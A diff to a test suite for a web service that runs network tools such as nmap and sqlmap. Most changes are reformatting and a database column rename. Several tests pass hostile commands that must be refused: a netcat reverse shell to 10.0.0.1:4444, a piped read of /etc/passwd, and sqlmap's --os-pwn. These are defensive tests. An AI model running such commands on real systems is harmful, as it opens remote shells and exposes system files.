+            mock.patch("blueprints.run.runtime_missing_command_name", return_value="nmap"),
+            mock.patch("blueprints.run._brokered_synthetic_run", return_value="run-missing") as synthetic,
+            mock.patch("blueprints.run.subprocess.Popen") as popen,
+        ):
             resp = client.post(
                 "/runs",
                 json={"command": "nmap -sV darklab.sh"},
-                headers={"X-Session-ID": anonymous_session_id('session-1')},
+                headers={"X-Session-ID": anonymous_session_id("session-1")},
             )
         assert resp.status_code == 202
         assert json.loads(resp.data) == {
@@ -21148,11 +21604,13 @@ class TestRunRoute:
         client = get_client()
         headers = {"X-Session-ID": anonymous_session_id("invalid-run-payloads")}
         public_started = mock.Mock(run_id="run-public-context", status="running")
-        with mock.patch("blueprints.run.broker_available", return_value=True), \
-             mock.patch(
-                 "blueprints.run._start_brokered_run_service",
-                 return_value=public_started,
-             ) as public_start:
+        with (
+            mock.patch("blueprints.run.broker_available", return_value=True),
+            mock.patch(
+                "blueprints.run._start_brokered_run_service",
+                return_value=public_started,
+            ) as public_start,
+        ):
             non_object = client.post("/runs", json=["hostname"], headers=headers)
             missing = client.post("/runs", json={}, headers=headers)
             non_string = client.post("/runs", json={"command": 42}, headers=headers)
@@ -21180,9 +21638,11 @@ class TestRunRoute:
     def test_brokered_run_disallowed_command_returns_403_before_spawning(self):
         client = get_client()
         headers = {"X-Session-ID": anonymous_session_id("disallowed-brokered-run")}
-        with mock.patch("blueprints.run.broker_available", return_value=True), \
-             mock.patch("blueprints.run.is_command_allowed", return_value=(False, "blocked")), \
-             mock.patch("blueprints.run.subprocess.Popen") as popen:
+        with (
+            mock.patch("blueprints.run.broker_available", return_value=True),
+            mock.patch("blueprints.run.is_command_allowed", return_value=(False, "blocked")),
+            mock.patch("blueprints.run.subprocess.Popen") as popen,
+        ):
             resp = client.post(
                 "/runs",
                 json={"command": "nmap -sS 127.0.0.1"},
@@ -21198,12 +21658,13 @@ class TestRunRoute:
             "sqlmap -u https://darklab.sh/item?id=1 --os-pwn",
             "sqlmap -u https://darklab.sh/item?id=1 --preprocess attacker.py",
         )
-        with mock.patch("blueprints.run.broker_available", return_value=True), \
-             mock.patch("blueprints.run.subprocess.Popen") as sqlmap_popen, \
-             mock.patch("blueprints.run._brokered_synthetic_run") as synthetic:
+        with (
+            mock.patch("blueprints.run.broker_available", return_value=True),
+            mock.patch("blueprints.run.subprocess.Popen") as sqlmap_popen,
+            mock.patch("blueprints.run._brokered_synthetic_run") as synthetic,
+        ):
             responses = [
-                client.post("/runs", json={"command": command}, headers=headers)
-                for command in dangerous_sqlmap_commands
+                client.post("/runs", json={"command": command}, headers=headers) for command in dangerous_sqlmap_commands
             ]
 
         assert [response.status_code for response in responses] == [403, 403, 403]
@@ -21222,24 +21683,26 @@ class TestRunRoute:
         raw_workflow_command = f"printf '%s\\n' {private_value}"
         display_workflow_command = "printf '%s\\n' [redacted]"
 
-        with mock.patch("blueprints.run.broker_available", return_value=True), \
-             mock.patch("blueprints.run.is_command_allowed", return_value=(True, "")), \
-             mock.patch(
-                 "blueprints.run.rewrite_command",
-                 side_effect=lambda command, **_kwargs: (command, "rewritten"),
-             ), \
-             mock.patch("blueprints.run.runtime_missing_command_name", return_value=None), \
-             mock.patch("blueprints.run.subprocess.Popen", return_value=fake_proc) as popen, \
-             mock.patch("blueprints.run.pid_register") as pid_register, \
-             mock.patch("blueprints.run.active_run_register") as active_register, \
-             mock.patch("blueprints.run.publish_run_event") as publish, \
-             mock.patch("blueprints.run.STDBUF_BIN", "/usr/bin/stdbuf"), \
-             mock.patch("services.runs.start.threading", mock.Mock(Thread=_CapturedThread)), \
-             mock.patch("blueprints.run.uuid.uuid4", return_value="run-real"):
+        with (
+            mock.patch("blueprints.run.broker_available", return_value=True),
+            mock.patch("blueprints.run.is_command_allowed", return_value=(True, "")),
+            mock.patch(
+                "blueprints.run.rewrite_command",
+                side_effect=lambda command, **_kwargs: (command, "rewritten"),
+            ),
+            mock.patch("blueprints.run.runtime_missing_command_name", return_value=None),
+            mock.patch("blueprints.run.subprocess.Popen", return_value=fake_proc) as popen,
+            mock.patch("blueprints.run.pid_register") as pid_register,
+            mock.patch("blueprints.run.active_run_register") as active_register,
+            mock.patch("blueprints.run.publish_run_event") as publish,
+            mock.patch("blueprints.run.STDBUF_BIN", "/usr/bin/stdbuf"),
+            mock.patch("services.runs.start.threading", mock.Mock(Thread=_CapturedThread)),
+            mock.patch("blueprints.run.uuid.uuid4", return_value="run-real"),
+        ):
             resp = client.post(
                 "/runs",
                 json={"command": "ping darklab.sh", "tab_id": "tab-1"},
-                headers={"X-Session-ID": anonymous_session_id('session-1'), "X-Client-ID": "client-1"},
+                headers={"X-Session-ID": anonymous_session_id("session-1"), "X-Client-ID": "client-1"},
             )
             workflow_handlers = replace(
                 run_routes._run_start_handlers(),
@@ -21325,11 +21788,13 @@ class TestRunRoute:
         assert workflow_thread.kwargs["workspace_notices"] == [
             "[workspace] writing public.txt",
         ]
-        assert workflow_thread.kwargs["workspace_artifacts"] == [{
-            "workspace_path": "public.txt",
-            "display_name": "public.txt",
-            "kind": "output",
-        }]
+        assert workflow_thread.kwargs["workspace_artifacts"] == [
+            {
+                "workspace_path": "public.txt",
+                "display_name": "public.txt",
+                "kind": "output",
+            }
+        ]
         assert private_value not in json.dumps(workflow_thread.kwargs, default=str)
         assert private_value not in caplog.text
 
@@ -21337,23 +21802,25 @@ class TestRunRoute:
         client = get_client()
         team_scope = mock.Mock(team_id="team-1", is_team=True, member={"role": "operator"})
         fake_run = mock.Mock(run_id="pty-team-run", rows=24, cols=100)
-        with mock.patch("blueprints.run.pty_enabled", return_value=True), \
-             mock.patch("blueprints.run.pty_broker_available", return_value=True), \
-             mock.patch("blueprints.run.current_request_scope", return_value=team_scope), \
-             mock.patch(
-                 "blueprints.run._prepare_interactive_pty_command",
-                 return_value=(
-                     ["mtr", "darklab.sh"],
-                     "mtr --interactive darklab.sh",
-                     {"allow_input": True},
-                 ),
-             ), \
-             mock.patch("blueprints.run._active_interactive_pty_count", return_value=0), \
-             mock.patch("blueprints.run._interactive_pty_concurrency_limit", return_value=4), \
-             mock.patch("blueprints.run.start_pty_run", return_value=fake_run) as start:
+        with (
+            mock.patch("blueprints.run.pty_enabled", return_value=True),
+            mock.patch("blueprints.run.pty_broker_available", return_value=True),
+            mock.patch("blueprints.run.current_request_scope", return_value=team_scope),
+            mock.patch(
+                "blueprints.run._prepare_interactive_pty_command",
+                return_value=(
+                    ["mtr", "darklab.sh"],
+                    "mtr --interactive darklab.sh",
+                    {"allow_input": True},
+                ),
+            ),
+            mock.patch("blueprints.run._active_interactive_pty_count", return_value=0),
+            mock.patch("blueprints.run._interactive_pty_concurrency_limit", return_value=4),
+            mock.patch("blueprints.run.start_pty_run", return_value=fake_run) as start,
+        ):
             resp = client.post(
                 "/pty/runs",
-                headers={"X-Session-ID": anonymous_session_id('member-session'), "X-Team-ID": "team-1"},
+                headers={"X-Session-ID": anonymous_session_id("member-session"), "X-Team-ID": "team-1"},
                 json={"command": "mtr --interactive darklab.sh", "tab_id": "tab-1"},
             )
 
@@ -21366,11 +21833,13 @@ class TestRunRoute:
         client = get_client()
         fake_event = mock.Mock(event_id="10-0", payload={"type": "output", "text": "hello"})
         fake_event.as_payload.return_value = {"event_id": "10-0", "type": "output", "text": "hello"}
-        with mock.patch("blueprints.run.active_runs_for_session", return_value=[{"run_id": "run-1"}]), \
-             mock.patch("blueprints.run.get_run_events", return_value=[fake_event]) as get_events:
+        with (
+            mock.patch("blueprints.run.active_runs_for_session", return_value=[{"run_id": "run-1"}]),
+            mock.patch("blueprints.run.get_run_events", return_value=[fake_event]) as get_events,
+        ):
             resp = client.get(
                 "/runs/run-1/events?after=9-0&limit=25",
-                headers={"X-Session-ID": anonymous_session_id('session-1')},
+                headers={"X-Session-ID": anonymous_session_id("session-1")},
             )
         assert resp.status_code == 200
         assert json.loads(resp.data) == {
@@ -21380,13 +21849,15 @@ class TestRunRoute:
         get_events.assert_called_once_with("run-1", after_id="9-0", limit=25)
 
         team_scope = mock.Mock(team_id="team-1", is_team=True, member={"role": "viewer"})
-        with mock.patch("blueprints.run.current_request_scope", return_value=team_scope), \
-             mock.patch("blueprints.run.active_run_belongs_to_scope", return_value=False), \
-             mock.patch("blueprints.run.active_runs_for_team", return_value=[{"run_id": "run-team"}]), \
-             mock.patch("blueprints.run.get_run_events", return_value=[fake_event]) as team_get_events:
+        with (
+            mock.patch("blueprints.run.current_request_scope", return_value=team_scope),
+            mock.patch("blueprints.run.active_run_belongs_to_scope", return_value=False),
+            mock.patch("blueprints.run.active_runs_for_team", return_value=[{"run_id": "run-team"}]),
+            mock.patch("blueprints.run.get_run_events", return_value=[fake_event]) as team_get_events,
+        ):
             team_resp = client.get(
                 "/runs/run-team/events?after=9-0&limit=25",
-                headers={"X-Session-ID": anonymous_session_id('member-session'), "X-Team-ID": "team-1"},
+                headers={"X-Session-ID": anonymous_session_id("member-session"), "X-Team-ID": "team-1"},
             )
 
         assert team_resp.status_code == 200
@@ -21395,11 +21866,13 @@ class TestRunRoute:
 
     def test_brokered_run_events_rejects_runs_outside_session(self):
         client = get_client()
-        with mock.patch("blueprints.run.active_runs_for_session", return_value=[]), \
-             mock.patch("blueprints.run.get_run_events") as get_events:
+        with (
+            mock.patch("blueprints.run.active_runs_for_session", return_value=[]),
+            mock.patch("blueprints.run.get_run_events") as get_events,
+        ):
             resp = client.get(
                 "/runs/run-other/events",
-                headers={"X-Session-ID": anonymous_session_id('session-1')},
+                headers={"X-Session-ID": anonymous_session_id("session-1")},
             )
 
         assert resp.status_code == 404
@@ -21408,12 +21881,14 @@ class TestRunRoute:
 
     def test_brokered_run_stream_replays_events_for_session_run(self):
         client = get_client()
-        with mock.patch("blueprints.run.active_runs_for_session", return_value=[{"run_id": "run-1"}]), \
-             mock.patch("blueprints.run.stream_run_events", return_value=iter(["data: one\n\n"])), \
-             mock.patch("blueprints.run.active_run_touch_owner") as touch:
+        with (
+            mock.patch("blueprints.run.active_runs_for_session", return_value=[{"run_id": "run-1"}]),
+            mock.patch("blueprints.run.stream_run_events", return_value=iter(["data: one\n\n"])),
+            mock.patch("blueprints.run.active_run_touch_owner") as touch,
+        ):
             resp = client.get(
                 "/runs/run-1/stream?after=9-0&tab_id=tab-1",
-                headers={"X-Session-ID": anonymous_session_id('session-1'), "X-Client-ID": "client-1"},
+                headers={"X-Session-ID": anonymous_session_id("session-1"), "X-Client-ID": "client-1"},
             )
             body = resp.get_data(as_text=True)
         assert resp.status_code == 200
@@ -21421,11 +21896,13 @@ class TestRunRoute:
         touch.assert_called_once_with("run-1", "client-1", "tab-1")
 
         team_scope = mock.Mock(team_id="team-1", is_team=True, member={"role": "viewer"})
-        with mock.patch("blueprints.run.current_request_scope", return_value=team_scope), \
-             mock.patch("blueprints.run.active_run_belongs_to_scope", return_value=False), \
-             mock.patch("blueprints.run.active_runs_for_team", return_value=[{"run_id": "run-team"}]), \
-             mock.patch("blueprints.run.stream_run_events", return_value=iter(["data: team\n\n"])), \
-             mock.patch("blueprints.run.active_run_touch_owner") as team_touch:
+        with (
+            mock.patch("blueprints.run.current_request_scope", return_value=team_scope),
+            mock.patch("blueprints.run.active_run_belongs_to_scope", return_value=False),
+            mock.patch("blueprints.run.active_runs_for_team", return_value=[{"run_id": "run-team"}]),
+            mock.patch("blueprints.run.stream_run_events", return_value=iter(["data: team\n\n"])),
+            mock.patch("blueprints.run.active_run_touch_owner") as team_touch,
+        ):
             team_resp = client.get(
                 "/runs/run-team/stream?after=9-0&tab_id=tab-1",
                 headers={
@@ -21443,13 +21920,15 @@ class TestRunRoute:
     def test_brokered_run_stream_throttles_owner_liveness_refresh(self):
         client = get_client()
         events = ["data: one\n\n", "data: two\n\n", "data: three\n\n"]
-        with mock.patch("blueprints.run.active_runs_for_session", return_value=[{"run_id": "run-1"}]), \
-             mock.patch("blueprints.run.stream_run_events", return_value=iter(events)), \
-             mock.patch("blueprints.run._active_run_owner_touch_monotonic", side_effect=[100.0, 101.0, 105.0]), \
-             mock.patch("blueprints.run.active_run_touch_owner") as touch:
+        with (
+            mock.patch("blueprints.run.active_runs_for_session", return_value=[{"run_id": "run-1"}]),
+            mock.patch("blueprints.run.stream_run_events", return_value=iter(events)),
+            mock.patch("blueprints.run._active_run_owner_touch_monotonic", side_effect=[100.0, 101.0, 105.0]),
+            mock.patch("blueprints.run.active_run_touch_owner") as touch,
+        ):
             resp = client.get(
                 "/runs/run-1/stream?tab_id=tab-1",
-                headers={"X-Session-ID": anonymous_session_id('session-1'), "X-Client-ID": "client-1"},
+                headers={"X-Session-ID": anonymous_session_id("session-1"), "X-Client-ID": "client-1"},
             )
             body = resp.get_data(as_text=True)
 
@@ -21462,12 +21941,14 @@ class TestRunRoute:
 
     def test_brokered_run_stream_allows_registered_run_that_exited_before_persistence(self):
         client = get_client()
-        with mock.patch("blueprints.run.active_run_belongs_to_scope", return_value=True), \
-             mock.patch("blueprints.run.active_runs_for_session") as active_runs, \
-             mock.patch("blueprints.run.stream_run_events", return_value=iter(["data: fast-exit\n\n"])):
+        with (
+            mock.patch("blueprints.run.active_run_belongs_to_scope", return_value=True),
+            mock.patch("blueprints.run.active_runs_for_session") as active_runs,
+            mock.patch("blueprints.run.stream_run_events", return_value=iter(["data: fast-exit\n\n"])),
+        ):
             resp = client.get(
                 "/runs/run-fast/stream",
-                headers={"X-Session-ID": anonymous_session_id('session-1')},
+                headers={"X-Session-ID": anonymous_session_id("session-1")},
             )
             body = resp.get_data(as_text=True)
 
@@ -21477,12 +21958,14 @@ class TestRunRoute:
 
     def test_brokered_run_stream_rejects_runs_outside_session(self):
         client = get_client()
-        with mock.patch("blueprints.run.active_runs_for_session", return_value=[]), \
-             mock.patch("blueprints.run.stream_run_events") as stream_events, \
-             mock.patch("blueprints.run.log.warning") as warn:
+        with (
+            mock.patch("blueprints.run.active_runs_for_session", return_value=[]),
+            mock.patch("blueprints.run.stream_run_events") as stream_events,
+            mock.patch("blueprints.run.log.warning") as warn,
+        ):
             resp = client.get(
                 "/runs/run-other/stream",
-                headers={"X-Session-ID": anonymous_session_id('session-1'), "X-Client-ID": "client-1"},
+                headers={"X-Session-ID": anonymous_session_id("session-1"), "X-Client-ID": "client-1"},
             )
 
         assert resp.status_code == 404
@@ -21503,17 +21986,19 @@ class TestRunRoute:
             [],
             [{"run_id": "run-team-scope", "team_id": "team_scope"}],
         ]
-        with mock.patch("blueprints.run.active_runs_for_session", side_effect=active_sequences), \
-             mock.patch("blueprints.run.get_run_events") as get_events, \
-             mock.patch("blueprints.run.stream_run_events") as stream_events, \
-             mock.patch("blueprints.run.log.warning") as warn:
+        with (
+            mock.patch("blueprints.run.active_runs_for_session", side_effect=active_sequences),
+            mock.patch("blueprints.run.get_run_events") as get_events,
+            mock.patch("blueprints.run.stream_run_events") as stream_events,
+            mock.patch("blueprints.run.log.warning") as warn,
+        ):
             events_resp = client.get(
                 "/runs/run-team-scope/events",
-                headers={"X-Session-ID": anonymous_session_id('session-1')},
+                headers={"X-Session-ID": anonymous_session_id("session-1")},
             )
             stream_resp = client.get(
                 "/runs/run-team-scope/stream",
-                headers={"X-Session-ID": anonymous_session_id('session-1')},
+                headers={"X-Session-ID": anonymous_session_id("session-1")},
             )
 
         expected = {
@@ -21536,39 +22021,47 @@ class TestRunRoute:
         client = get_client()
         resp = client.post(
             "/runs/run-1/owner",
-            headers={"X-Session-ID": anonymous_session_id('session-1'), "X-Client-ID": "client-2"},
+            headers={"X-Session-ID": anonymous_session_id("session-1"), "X-Client-ID": "client-2"},
             json={"tab_id": "tab-2"},
         )
         assert resp.status_code == 404
 
     def test_kill_allows_same_session_attached_client_and_publishes_killer(self):
         client = get_client()
-        with mock.patch("blueprints.run.pid_for_session", return_value=4321) as pid_lookup, \
-             mock.patch("blueprints.run.publish_run_event") as publish, \
-             mock.patch("blueprints.run.SCANNER_PREFIX", ""), \
-             mock.patch("blueprints.run.os.killpg") as killpg:
+        with (
+            mock.patch("blueprints.run.pid_for_session", return_value=4321) as pid_lookup,
+            mock.patch("blueprints.run.publish_run_event") as publish,
+            mock.patch("blueprints.run.SCANNER_PREFIX", ""),
+            mock.patch("blueprints.run.os.killpg") as killpg,
+        ):
             resp = client.post(
                 "/kill",
-                headers={"X-Session-ID": anonymous_session_id('session-1'), "X-Client-ID": "client-2"},
+                headers={"X-Session-ID": anonymous_session_id("session-1"), "X-Client-ID": "client-2"},
                 json={"run_id": "run-1", "tab_id": "tab-2"},
             )
         assert resp.status_code == 200
         assert json.loads(resp.data) == {"killed": True}
         pid_lookup.assert_called_once_with("run-1", anonymous_session_id("session-1"))
-        publish.assert_called_once_with("run-1", "killed", {
-            "killer_client_id": "client-2",
-            "killer_tab_id": "tab-2",
-        })
+        publish.assert_called_once_with(
+            "run-1",
+            "killed",
+            {
+                "killer_client_id": "client-2",
+                "killer_tab_id": "tab-2",
+            },
+        )
         killpg.assert_called_once_with(4321, signal.SIGTERM)
 
         team_scope = mock.Mock(team_id="team-1", is_team=True, member={"id": "tmem-killer", "role": "operator"})
-        with mock.patch("blueprints.run.current_request_scope", return_value=team_scope), \
-             mock.patch("blueprints.run.active_runs_for_team", return_value=[{"run_id": "run-team"}]), \
-             mock.patch("blueprints.run.pid_for_team", return_value=8765) as team_pid_lookup, \
-             mock.patch("blueprints.run.publish_run_event") as team_publish, \
-             mock.patch("blueprints.run.SCANNER_PREFIX", ""), \
-             mock.patch("blueprints.run.os.killpg") as team_killpg, \
-             mock.patch.object(shell_app_module.log, "info") as team_info:
+        with (
+            mock.patch("blueprints.run.current_request_scope", return_value=team_scope),
+            mock.patch("blueprints.run.active_runs_for_team", return_value=[{"run_id": "run-team"}]),
+            mock.patch("blueprints.run.pid_for_team", return_value=8765) as team_pid_lookup,
+            mock.patch("blueprints.run.publish_run_event") as team_publish,
+            mock.patch("blueprints.run.SCANNER_PREFIX", ""),
+            mock.patch("blueprints.run.os.killpg") as team_killpg,
+            mock.patch.object(shell_app_module.log, "info") as team_info,
+        ):
             team_resp = client.post(
                 "/kill",
                 headers={
@@ -21580,10 +22073,14 @@ class TestRunRoute:
             )
         assert team_resp.status_code == 200
         team_pid_lookup.assert_called_once_with("run-team", "team-1")
-        team_publish.assert_called_once_with("run-team", "killed", {
-            "killer_client_id": "client-2",
-            "killer_tab_id": "tab-2",
-        })
+        team_publish.assert_called_once_with(
+            "run-team",
+            "killed",
+            {
+                "killer_client_id": "client-2",
+                "killer_tab_id": "tab-2",
+            },
+        )
         team_killpg.assert_called_once_with(8765, signal.SIGTERM)
         kill_extra = next(c.kwargs["extra"] for c in team_info.call_args_list if c.args and c.args[0] == "RUN_KILL")
         assert kill_extra["team_id"] == "team-1"
@@ -21592,11 +22089,13 @@ class TestRunRoute:
 
     def test_kill_rejects_runs_outside_session(self):
         client = get_client()
-        with mock.patch("blueprints.run.pid_for_session", return_value=None) as pid_lookup, \
-             mock.patch("blueprints.run.publish_run_event") as publish:
+        with (
+            mock.patch("blueprints.run.pid_for_session", return_value=None) as pid_lookup,
+            mock.patch("blueprints.run.publish_run_event") as publish,
+        ):
             resp = client.post(
                 "/kill",
-                headers={"X-Session-ID": anonymous_session_id('session-1'), "X-Client-ID": "client-2"},
+                headers={"X-Session-ID": anonymous_session_id("session-1"), "X-Client-ID": "client-2"},
                 json={"run_id": "run-1"},
             )
         assert resp.status_code == 404
@@ -21605,11 +22104,13 @@ class TestRunRoute:
         publish.assert_not_called()
 
         viewer_scope = mock.Mock(team_id="team-1", is_team=True, member={"role": "viewer"})
-        with mock.patch("blueprints.run.current_request_scope", return_value=viewer_scope), \
-             mock.patch("blueprints.run.pid_for_team") as team_pid_lookup:
+        with (
+            mock.patch("blueprints.run.current_request_scope", return_value=viewer_scope),
+            mock.patch("blueprints.run.pid_for_team") as team_pid_lookup,
+        ):
             viewer_resp = client.post(
                 "/kill",
-                headers={"X-Session-ID": anonymous_session_id('viewer-session'), "X-Team-ID": "team-1"},
+                headers={"X-Session-ID": anonymous_session_id("viewer-session"), "X-Team-ID": "team-1"},
                 json={"run_id": "run-team"},
             )
 
@@ -21622,8 +22123,10 @@ class TestRunRoute:
         headers = {"X-Session-ID": anonymous_session_id("disallowed-command")}
         # Patch in commands' namespace — is_command_allowed calls load_command_policy
         # from commands' own namespace, not from app's.
-        with mock.patch("blueprints.run.broker_available", return_value=True), \
-             mock.patch("services.commands.registry.load_command_policy", return_value=(["ping"], [])):
+        with (
+            mock.patch("blueprints.run.broker_available", return_value=True),
+            mock.patch("services.commands.registry.load_command_policy", return_value=(["ping"], [])),
+        ):
             resp = client.post(
                 "/runs",
                 json={"command": "nc -e /bin/sh 10.0.0.1 4444"},
@@ -21634,8 +22137,10 @@ class TestRunRoute:
     def test_shell_operator_returns_403(self):
         client = get_client()
         headers = {"X-Session-ID": anonymous_session_id("shell-operator")}
-        with mock.patch("blueprints.run.broker_available", return_value=True), \
-             mock.patch("services.commands.registry.load_command_policy", return_value=(["ping"], [])):
+        with (
+            mock.patch("blueprints.run.broker_available", return_value=True),
+            mock.patch("services.commands.registry.load_command_policy", return_value=(["ping"], [])),
+        ):
             resp = client.post(
                 "/runs",
                 json={"command": "ping google.com | cat /etc/passwd"},
@@ -21716,7 +22221,7 @@ class TestRunRoute:
             assert detail["output"] == ["Available themes:", "Dark themes:"]
         finally:
             conn = sqlite3.connect(DB_PATH)
-            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
+            conn.execute("DELETE FROM runs WHERE personal_workspace_id = ?", (session,))
             conn.commit()
             conn.close()
 
@@ -21747,10 +22252,12 @@ class TestRunRoute:
                     json={
                         "command": "theme current",
                         "exit_code": 0,
-                        "lines": [{
-                            "text": "Finding CVE-2026-1234 reported by admin@example.com",
-                            "cls": "builtin-section",
-                        }],
+                        "lines": [
+                            {
+                                "text": "Finding CVE-2026-1234 reported by admin@example.com",
+                                "cls": "builtin-section",
+                            }
+                        ],
                     },
                 )
             data = json.loads(resp.data)
@@ -21772,17 +22279,15 @@ class TestRunRoute:
             assert preview[0]["text"] == "Finding CVE-2026-1234 reported by [email-redacted]"
             assert "admin@example.com" not in output_search_text
             assert "[email-redacted]" in output_search_text
-            assert [(item["type"], item["canonical_value"]) for item in entity_rows] == [
-                ("cve", "CVE-2026-1234")
-            ]
+            assert [(item["type"], item["canonical_value"]) for item in entity_rows] == [("cve", "CVE-2026-1234")]
         finally:
             conn = sqlite3.connect(DB_PATH)
             conn.execute(
-                "DELETE FROM entity_run_links WHERE run_id IN (SELECT id FROM runs WHERE session_id = ?)",
+                "DELETE FROM entity_run_links WHERE run_id IN (SELECT id FROM runs WHERE personal_workspace_id = ?)",
                 (session,),
             )
-            conn.execute("DELETE FROM entities WHERE session_id = ?", (session,))
-            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
+            conn.execute("DELETE FROM entities WHERE personal_workspace_id = ?", (session,))
+            conn.execute("DELETE FROM runs WHERE personal_workspace_id = ?", (session,))
             conn.commit()
             conn.close()
 
@@ -21791,9 +22296,11 @@ class TestRunRoute:
 
         client = get_client()
         session = anonymous_session_id("client-run-offload-" + uuid.uuid4().hex[:8])
-        with tempfile.TemporaryDirectory() as tmp, \
-             mock.patch.object(body_store, "DATA_DIR", tmp), \
-             mock.patch.dict("config.CFG", {"runs_search_text_inline_max_bytes": 1}):
+        with (
+            tempfile.TemporaryDirectory() as tmp,
+            mock.patch.object(body_store, "DATA_DIR", tmp),
+            mock.patch.dict("config.CFG", {"runs_search_text_inline_max_bytes": 1}),
+        ):
             offloaded_line = "Available themes: " + ("x" * 4100) + " needle-after-pointer-preview"
             resp = client.post(
                 "/run/client",
@@ -21870,7 +22377,7 @@ class TestRunRoute:
             assert huge_line not in preview[0]["text"]
         finally:
             conn = sqlite3.connect(DB_PATH)
-            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
+            conn.execute("DELETE FROM runs WHERE personal_workspace_id = ?", (session,))
             conn.commit()
             conn.close()
 
@@ -21904,7 +22411,7 @@ class TestRunRoute:
             assert history["total_count"] == 1
         finally:
             conn = sqlite3.connect(DB_PATH)
-            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
+            conn.execute("DELETE FROM runs WHERE personal_workspace_id = ?", (session,))
             conn.commit()
             conn.close()
 
@@ -21944,9 +22451,9 @@ class TestRunRoute:
             ).fetchone()
         finally:
             conn.execute("DELETE FROM project_links WHERE project_id = ?", (project["id"],))
-            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
-            conn.execute("DELETE FROM session_preferences WHERE session_id = ?", (session,))
-            conn.execute("DELETE FROM projects WHERE session_id = ?", (session,))
+            conn.execute("DELETE FROM runs WHERE personal_workspace_id = ?", (session,))
+            conn.execute("DELETE FROM session_preferences WHERE personal_workspace_id = ?", (session,))
+            conn.execute("DELETE FROM projects WHERE personal_workspace_id = ?", (session,))
             conn.commit()
             conn.close()
         assert row is None
@@ -21966,17 +22473,16 @@ class TestRunRoute:
 
 # ── /history ──────────────────────────────────────────────────────────────────
 
+
 class TestHistoryRoute:
     def test_get_returns_200(self):
         client = get_client()
-        resp = client.get("/history", headers={"X-Session-ID": anonymous_session_id('test-session')})
+        resp = client.get("/history", headers={"X-Session-ID": anonymous_session_id("test-session")})
         assert resp.status_code == 200
 
     def test_get_returns_runs_list(self):
         client = get_client()
-        data = json.loads(
-            client.get("/history", headers={"X-Session-ID": anonymous_session_id('test-session')}).data
-        )
+        data = json.loads(client.get("/history", headers={"X-Session-ID": anonymous_session_id("test-session")}).data)
         assert "items" in data
         assert isinstance(data["items"], list)
         assert "runs" in data
@@ -21992,34 +22498,31 @@ class TestHistoryRoute:
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
-                (run_ids[0], session, "nmap -sT ip.darklab.sh", "2026-01-01T00:00:00",
-                 "2026-01-01T00:00:10", 0, "[]"),
+                (run_ids[0], session, "nmap -sT ip.darklab.sh", "2026-01-01T00:00:00", "2026-01-01T00:00:10", 0, "[]"),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
-                (run_ids[1], session, "curl https://ip.darklab.sh", "2026-01-01T00:01:00",
-                 "2026-01-01T00:01:20", 1, "[]"),
+                (run_ids[1], session, "curl https://ip.darklab.sh", "2026-01-01T00:01:00", "2026-01-01T00:01:20", 1, "[]"),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
-                (run_ids[2], session, "ping ip.darklab.sh", "2026-01-01T00:02:00",
-                 "2026-01-01T00:02:15", -15, "[]"),
+                (run_ids[2], session, "ping ip.darklab.sh", "2026-01-01T00:02:00", "2026-01-01T00:02:15", -15, "[]"),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
                 (run_ids[3], session, "sleep 60", "2026-01-01T00:03:00", None, None, "[]"),
             )
             conn.execute(
-                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
+                "INSERT INTO snapshots (id, personal_workspace_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
                 (snapshot_id, session, "snap", "2026-01-01T00:03:00", "[]"),
             )
             conn.execute(
-                "INSERT INTO starred_commands (session_id, command) VALUES (?, ?)",
+                "INSERT INTO starred_commands (personal_workspace_id, command) VALUES (?, ?)",
                 (session, "nmap -sT ip.darklab.sh"),
             )
             conn.commit()
@@ -22036,7 +22539,7 @@ class TestHistoryRoute:
             with sqlite3.connect(DB_PATH) as conn:
                 conn.execute("DELETE FROM runs WHERE id IN (?, ?, ?, ?)", run_ids)
                 conn.execute("DELETE FROM snapshots WHERE id = ?", (snapshot_id,))
-                conn.execute("DELETE FROM starred_commands WHERE session_id = ?", (session,))
+                conn.execute("DELETE FROM starred_commands WHERE personal_workspace_id = ?", (session,))
                 conn.commit()
 
     def test_stats_tolerates_missing_optional_counter_tables(self):
@@ -22046,7 +22549,7 @@ class TestHistoryRoute:
         try:
             with sqlite3.connect(DB_PATH) as conn:
                 conn.execute(
-                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                    "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                     "VALUES (?, ?, ?, ?, ?, ?, ?)",
                     (
                         run_id,
@@ -22059,11 +22562,11 @@ class TestHistoryRoute:
                     ),
                 )
                 conn.execute(
-                    "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
+                    "INSERT INTO snapshots (id, personal_workspace_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
                     (f"{session}-snapshot", session, "snap", "2026-01-01T00:00:00", "[]"),
                 )
                 conn.execute(
-                    "INSERT INTO starred_commands (session_id, command) VALUES (?, ?)",
+                    "INSERT INTO starred_commands (personal_workspace_id, command) VALUES (?, ?)",
                     (session, "nmap -sT ip.darklab.sh"),
                 )
                 conn.commit()
@@ -22078,8 +22581,8 @@ class TestHistoryRoute:
         finally:
             with sqlite3.connect(DB_PATH) as conn:
                 conn.execute("DELETE FROM runs WHERE id = ?", (run_id,))
